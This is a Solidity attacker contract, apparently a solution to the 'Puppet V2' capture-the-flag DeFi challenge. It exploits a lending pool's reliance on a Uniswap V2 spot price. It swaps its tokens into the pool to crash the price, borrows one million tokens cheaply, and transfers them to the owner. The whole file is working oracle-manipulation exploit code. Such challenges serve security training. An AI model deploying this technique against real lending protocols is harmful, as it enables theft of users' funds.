// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@uniswap/v2-periphery/contracts/interfaces/IERC20.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "hardhat/console.sol";
import "../Attacker.sol";

interface IPool {
    function borrow(uint256 borrowAmount) external;
    function calculateDepositOfWETHRequired(uint256 tokenAmount) external view returns (uint256);
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

contract PuppetV2Attacker is Attacker {
    IERC20 private immutable _token;
    IWETH private immutable _weth;
    IUniswapV2Router01 private immutable _uniswapRouter;
    IUniswapV2Pair private immutable _uniswapPair;
    IPool private immutable _pool;

    constructor(address wethAddress, address tokenAddress, address uniswapRouterAddress, address uniswapPairAddress,address poolAddress) payable {
        _token = IERC20(tokenAddress);
        _weth = IWETH(wethAddress);
        _uniswapRouter = IUniswapV2Router01(uniswapRouterAddress);
        _uniswapPair = IUniswapV2Pair(uniswapPairAddress);
        _pool = IPool(poolAddress);
    }

    function startAttack() external override onlyOwner {
        address thisAddress = address(this);
  
        _token.approve(address(_uniswapRouter), type(uint256).max);
        _weth.deposit{value: thisAddress.balance}();

        address[] memory addresses = new address[](2);

        addresses[0] = address(_token);
        addresses[1] = address(_weth);

        _uniswapRouter.swapExactTokensForTokens(_token.balanceOf(thisAddress), 9.4 ether, addresses, thisAddress, block.timestamp * 2);

        _weth.approve(address(_pool), type(uint256).max);
        _pool.borrow(1000000 * 10 ** 18);
        _token.transfer(owner(), _token.balanceOf(thisAddress));
    }   
}
